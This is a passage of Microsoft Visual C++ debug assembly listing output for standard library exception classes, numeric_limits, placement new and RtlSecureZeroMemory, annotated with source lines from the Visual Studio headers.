  00041	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00048	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0004f	5f		 pop	 rdi
  00050	5d		 pop	 rbp
  00051	c3		 ret	 0
??_Gbad_array_new_length@std@@UEAAPEAXI@Z ENDP		; std::bad_array_new_length::`scalar deleting destructor'
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
;	COMDAT ??0bad_array_new_length@std@@QEAA@AEBV01@@Z
_TEXT	SEGMENT
this$ = 224
__that$ = 232
??0bad_array_new_length@std@@QEAA@AEBV01@@Z PROC	; std::bad_array_new_length::bad_array_new_length, COMDAT
$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8b 95 e8 00
	00 00		 mov	 rdx, QWORD PTR __that$[rbp]
  0001f	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00026	e8 00 00 00 00	 call	 ??0bad_alloc@std@@QEAA@AEBV01@@Z
  0002b	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00032	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:??_7bad_array_new_length@std@@6B@
  00039	48 89 08	 mov	 QWORD PTR [rax], rcx
  0003c	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00043	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0004a	5f		 pop	 rdi
  0004b	5d		 pop	 rbp
  0004c	c3		 ret	 0
??0bad_array_new_length@std@@QEAA@AEBV01@@Z ENDP	; std::bad_array_new_length::bad_array_new_length
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
;	COMDAT ??1bad_array_new_length@std@@UEAA@XZ
_TEXT	SEGMENT
this$ = 224
??1bad_array_new_length@std@@UEAA@XZ PROC		; std::bad_array_new_length::~bad_array_new_length, COMDAT
$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0001a	e8 00 00 00 00	 call	 ??1bad_alloc@std@@UEAA@XZ
  0001f	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00026	5f		 pop	 rdi
  00027	5d		 pop	 rbp
  00028	c3		 ret	 0
??1bad_array_new_length@std@@UEAA@XZ ENDP		; std::bad_array_new_length::~bad_array_new_length
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\vcruntime_exception.h
;	COMDAT ??0bad_array_new_length@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 224
??0bad_array_new_length@std@@QEAA@XZ PROC		; std::bad_array_new_length::bad_array_new_length, COMDAT

; 141  :     {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__85F4241F_vcruntime_exception@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 140  :         : bad_alloc("bad array new length")

  0001f	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??_C@_0BF@KINCDENJ@bad?5array?5new?5length@
  00026	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0002d	e8 00 00 00 00	 call	 ??0bad_alloc@std@@AEAA@QEBD@Z ; std::bad_alloc::bad_alloc

; 141  :     {

  00032	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00039	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:??_7bad_array_new_length@std@@6B@
  00040	48 89 08	 mov	 QWORD PTR [rax], rcx

; 142  :     }

  00043	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0004a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00051	5f		 pop	 rdi
  00052	5d		 pop	 rbp
  00053	c3		 ret	 0
??0bad_array_new_length@std@@QEAA@XZ ENDP		; std::bad_array_new_length::bad_array_new_length
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
;	COMDAT ??_Gbad_alloc@std@@UEAAPEAXI@Z
_TEXT	SEGMENT
this$ = 224
__flags$ = 232
??_Gbad_alloc@std@@UEAAPEAXI@Z PROC			; std::bad_alloc::`scalar deleting destructor', COMDAT
$LN4:
  00000	89 54 24 10	 mov	 DWORD PTR [rsp+16], edx
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0001e	e8 00 00 00 00	 call	 ??1bad_alloc@std@@UEAA@XZ
  00023	8b 85 e8 00 00
	00		 mov	 eax, DWORD PTR __flags$[rbp]
  00029	83 e0 01	 and	 eax, 1
  0002c	85 c0		 test	 eax, eax
  0002e	74 11		 je	 SHORT $LN2@scalar
  00030	ba 18 00 00 00	 mov	 edx, 24
  00035	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0003c	e8 00 00 00 00	 call	 ??3@YAXPEAX_K@Z		; operator delete
$LN2@scalar:
  00041	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00048	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0004f	5f		 pop	 rdi
  00050	5d		 pop	 rbp
  00051	c3		 ret	 0
??_Gbad_alloc@std@@UEAAPEAXI@Z ENDP			; std::bad_alloc::`scalar deleting destructor'
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
;	COMDAT ??0bad_alloc@std@@QEAA@AEBV01@@Z
_TEXT	SEGMENT
this$ = 224
__that$ = 232
??0bad_alloc@std@@QEAA@AEBV01@@Z PROC			; std::bad_alloc::bad_alloc, COMDAT
$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8b 95 e8 00
	00 00		 mov	 rdx, QWORD PTR __that$[rbp]
  0001f	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00026	e8 00 00 00 00	 call	 ??0exception@std@@QEAA@AEBV01@@Z ; std::exception::exception
  0002b	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00032	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:??_7bad_alloc@std@@6B@
  00039	48 89 08	 mov	 QWORD PTR [rax], rcx
  0003c	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00043	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0004a	5f		 pop	 rdi
  0004b	5d		 pop	 rbp
  0004c	c3		 ret	 0
??0bad_alloc@std@@QEAA@AEBV01@@Z ENDP			; std::bad_alloc::bad_alloc
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
;	COMDAT ??1bad_alloc@std@@UEAA@XZ
_TEXT	SEGMENT
this$ = 224
??1bad_alloc@std@@UEAA@XZ PROC				; std::bad_alloc::~bad_alloc, COMDAT
$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0001a	e8 00 00 00 00	 call	 ??1exception@std@@UEAA@XZ ; std::exception::~exception
  0001f	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00026	5f		 pop	 rdi
  00027	5d		 pop	 rbp
  00028	c3		 ret	 0
??1bad_alloc@std@@UEAA@XZ ENDP				; std::bad_alloc::~bad_alloc
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\vcruntime_exception.h
;	COMDAT ??0bad_alloc@std@@AEAA@QEBD@Z
_TEXT	SEGMENT
this$ = 224
_Message$ = 232
??0bad_alloc@std@@AEAA@QEBD@Z PROC			; std::bad_alloc::bad_alloc, COMDAT

; 130  :     {

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__85F4241F_vcruntime_exception@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 129  :         : exception(_Message, 1)

  00024	41 b8 01 00 00
	00		 mov	 r8d, 1
  0002a	48 8b 95 e8 00
	00 00		 mov	 rdx, QWORD PTR _Message$[rbp]
  00031	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00038	e8 00 00 00 00	 call	 ??0exception@std@@QEAA@QEBDH@Z ; std::exception::exception

; 130  :     {

  0003d	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00044	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:??_7bad_alloc@std@@6B@
  0004b	48 89 08	 mov	 QWORD PTR [rax], rcx

; 131  :     }

  0004e	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00055	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0005c	5f		 pop	 rdi
  0005d	5d		 pop	 rbp
  0005e	c3		 ret	 0
??0bad_alloc@std@@AEAA@QEBD@Z ENDP			; std::bad_alloc::bad_alloc
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
;	COMDAT ??_Gexception@std@@UEAAPEAXI@Z
_TEXT	SEGMENT
this$ = 224
__flags$ = 232
??_Gexception@std@@UEAAPEAXI@Z PROC			; std::exception::`scalar deleting destructor', COMDAT
$LN4:
  00000	89 54 24 10	 mov	 DWORD PTR [rsp+16], edx
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0001e	e8 00 00 00 00	 call	 ??1exception@std@@UEAA@XZ ; std::exception::~exception
  00023	8b 85 e8 00 00
	00		 mov	 eax, DWORD PTR __flags$[rbp]
  00029	83 e0 01	 and	 eax, 1
  0002c	85 c0		 test	 eax, eax
  0002e	74 11		 je	 SHORT $LN2@scalar
  00030	ba 18 00 00 00	 mov	 edx, 24
  00035	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0003c	e8 00 00 00 00	 call	 ??3@YAXPEAX_K@Z		; operator delete
$LN2@scalar:
  00041	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00048	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0004f	5f		 pop	 rdi
  00050	5d		 pop	 rbp
  00051	c3		 ret	 0
??_Gexception@std@@UEAAPEAXI@Z ENDP			; std::exception::`scalar deleting destructor'
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\vcruntime_exception.h
;	COMDAT ?what@exception@std@@UEBAPEBDXZ
_TEXT	SEGMENT
tv69 = 192
this$ = 240
?what@exception@std@@UEBAPEBDXZ PROC			; std::exception::what, COMDAT

; 94   :     {

$LN5:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec f8 00
	00 00		 sub	 rsp, 248		; 000000f8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__85F4241F_vcruntime_exception@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 95   :         return _Data._What ? _Data._What : "Unknown exception";

  0001f	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	48 83 78 08 00	 cmp	 QWORD PTR [rax+8], 0
  0002b	74 14		 je	 SHORT $LN3@what
  0002d	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00034	48 8b 40 08	 mov	 rax, QWORD PTR [rax+8]
  00038	48 89 85 c0 00
	00 00		 mov	 QWORD PTR tv69[rbp], rax
  0003f	eb 0e		 jmp	 SHORT $LN4@what
$LN3@what:
  00041	48 8d 05 00 00
	00 00		 lea	 rax, OFFSET FLAT:??_C@_0BC@EOODALEL@Unknown?5exception@
  00048	48 89 85 c0 00
	00 00		 mov	 QWORD PTR tv69[rbp], rax
$LN4@what:
  0004f	48 8b 85 c0 00
	00 00		 mov	 rax, QWORD PTR tv69[rbp]

; 96   :     }

  00056	48 8d a5 d8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+216]
  0005d	5f		 pop	 rdi
  0005e	5d		 pop	 rbp
  0005f	c3		 ret	 0
?what@exception@std@@UEBAPEBDXZ ENDP			; std::exception::what
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\vcruntime_exception.h
;	COMDAT ??1exception@std@@UEAA@XZ
_TEXT	SEGMENT
this$ = 224
??1exception@std@@UEAA@XZ PROC				; std::exception::~exception, COMDAT

; 89   :     {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__85F4241F_vcruntime_exception@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode
  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:??_7exception@std@@6B@
  0002d	48 89 08	 mov	 QWORD PTR [rax], rcx

; 90   :         __std_exception_destroy(&_Data);

  00030	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00037	48 83 c0 08	 add	 rax, 8
  0003b	48 8b c8	 mov	 rcx, rax
  0003e	e8 00 00 00 00	 call	 __std_exception_destroy

; 91   :     }

  00043	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0004a	5f		 pop	 rdi
  0004b	5d		 pop	 rbp
  0004c	c3		 ret	 0
??1exception@std@@UEAA@XZ ENDP				; std::exception::~exception
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\vcruntime_exception.h
;	COMDAT ??0exception@std@@QEAA@AEBV01@@Z
_TEXT	SEGMENT
this$ = 224
_Other$ = 232
??0exception@std@@QEAA@AEBV01@@Z PROC			; std::exception::exception, COMDAT

; 72   :     {

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__85F4241F_vcruntime_exception@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode
  00024	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0002b	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:??_7exception@std@@6B@
  00032	48 89 08	 mov	 QWORD PTR [rax], rcx

; 71   :         : _Data()

  00035	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0003c	48 83 c0 08	 add	 rax, 8
  00040	48 8b f8	 mov	 rdi, rax
  00043	33 c0		 xor	 eax, eax
  00045	b9 10 00 00 00	 mov	 ecx, 16
  0004a	f3 aa		 rep stosb

; 73   :         __std_exception_copy(&_Other._Data, &_Data);

  0004c	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00053	48 83 c0 08	 add	 rax, 8
  00057	48 8b 8d e8 00
	00 00		 mov	 rcx, QWORD PTR _Other$[rbp]
  0005e	48 83 c1 08	 add	 rcx, 8
  00062	48 8b d0	 mov	 rdx, rax
  00065	e8 00 00 00 00	 call	 __std_exception_copy

; 74   :     }

  0006a	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00071	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00078	5f		 pop	 rdi
  00079	5d		 pop	 rbp
  0007a	c3		 ret	 0
??0exception@std@@QEAA@AEBV01@@Z ENDP			; std::exception::exception
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\vcruntime_exception.h
;	COMDAT ??0exception@std@@QEAA@QEBDH@Z
_TEXT	SEGMENT
this$ = 224
_Message$ = 232
__formal$ = 240
??0exception@std@@QEAA@QEBDH@Z PROC			; std::exception::exception, COMDAT

; 66   :     {

$LN3:
  00000	44 89 44 24 18	 mov	 DWORD PTR [rsp+24], r8d
  00005	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  0000a	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000f	55		 push	 rbp
  00010	57		 push	 rdi
  00011	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00018	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0001d	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__85F4241F_vcruntime_exception@h
  00024	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode
  00029	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00030	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:??_7exception@std@@6B@
  00037	48 89 08	 mov	 QWORD PTR [rax], rcx

; 65   :         : _Data()

  0003a	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00041	48 83 c0 08	 add	 rax, 8
  00045	48 8b f8	 mov	 rdi, rax
  00048	33 c0		 xor	 eax, eax
  0004a	b9 10 00 00 00	 mov	 ecx, 16
  0004f	f3 aa		 rep stosb

; 67   :         _Data._What = _Message;

  00051	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00058	48 8b 8d e8 00
	00 00		 mov	 rcx, QWORD PTR _Message$[rbp]
  0005f	48 89 48 08	 mov	 QWORD PTR [rax+8], rcx

; 68   :     }

  00063	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0006a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00071	5f		 pop	 rdi
  00072	5d		 pop	 rbp
  00073	c3		 ret	 0
??0exception@std@@QEAA@QEBDH@Z ENDP			; std::exception::exception
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\limits
;	COMDAT ?max@?$numeric_limits@_J@std@@SA_JXZ
_TEXT	SEGMENT
?max@?$numeric_limits@_J@std@@SA_JXZ PROC		; std::numeric_limits<__int64>::max, COMDAT

; 635  :     _NODISCARD static constexpr long long(max)() noexcept {

$LN3:
  00000	40 55		 push	 rbp
  00002	57		 push	 rdi
  00003	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000a	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0000f	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__09FBC026_limits
  00016	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 636  :         return LLONG_MAX;

  0001b	48 b8 ff ff ff
	ff ff ff ff 7f	 mov	 rax, 9223372036854775807 ; 7fffffffffffffffH

; 637  :     }

  00025	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0002c	5f		 pop	 rdi
  0002d	5d		 pop	 rbp
  0002e	c3		 ret	 0
?max@?$numeric_limits@_J@std@@SA_JXZ ENDP		; std::numeric_limits<__int64>::max
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\vcruntime_new.h
;	COMDAT ??2@YAPEAX_KPEAX@Z
_TEXT	SEGMENT
_Size$ = 224
_Where$ = 232
??2@YAPEAX_KPEAX@Z PROC					; operator new, COMDAT

; 168  :     {

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__A3D3E4E8_vcruntime_new@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 169  :         (void)_Size;
; 170  :         return _Where;

  00024	48 8b 85 e8 00
	00 00		 mov	 rax, QWORD PTR _Where$[rbp]

; 171  :     }

  0002b	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00032	5f		 pop	 rdi
  00033	5d		 pop	 rbp
  00034	c3		 ret	 0
??2@YAPEAX_KPEAX@Z ENDP					; operator new
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um\winnt.h
;	COMDAT RtlSecureZeroMemory
_TEXT	SEGMENT
vptr$ = 8
ptr$ = 256
cnt$ = 264
RtlSecureZeroMemory PROC				; COMDAT

; 21766: {

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__FBBA8F9D_winnt@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 21767:     volatile char *vptr = (volatile char *)ptr;

  00024	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR ptr$[rbp]
  0002b	48 89 45 08	 mov	 QWORD PTR vptr$[rbp], rax

; 21768: 
; 21769: #if defined(_M_AMD64) && !defined(_M_ARM64EC)
; 21770: 
; 21771:     __stosb((PBYTE )((DWORD64)vptr), 0, cnt);

  0002f	48 8b 7d 08	 mov	 rdi, QWORD PTR vptr$[rbp]
  00033	33 c0		 xor	 eax, eax
  00035	48 8b 8d 08 01
	00 00		 mov	 rcx, QWORD PTR cnt$[rbp]
  0003c	f3 aa		 rep stosb

; 21772: 
; 21773: #else
; 21774: 
; 21775:     while (cnt) {
; 21776: 
; 21777: #if !defined(_M_CEE) && (defined(_M_ARM) || defined(_M_ARM64) || defined(_M_ARM64EC))
; 21778: 
; 21779:         __iso_volatile_store8(vptr, 0);
; 21780: 
; 21781: #else
; 21782: 
; 21783:         *vptr = 0;
; 21784: 
; 21785: #endif
; 21786: 
; 21787:         vptr++;
; 21788:         cnt--;
; 21789:     }
; 21790: 
; 21791: #endif // _M_AMD64 && !defined(_M_ARM64EC)
; 21792: 
; 21793:     return ptr;

  0003e	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR ptr$[rbp]

; 21794: }

  00045	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  0004c	5f		 pop	 rdi
  0004d	5d		 pop	 rbp
  0004e	c3		 ret	 0
RtlSecureZeroMemory ENDP
_TEXT	ENDS
END
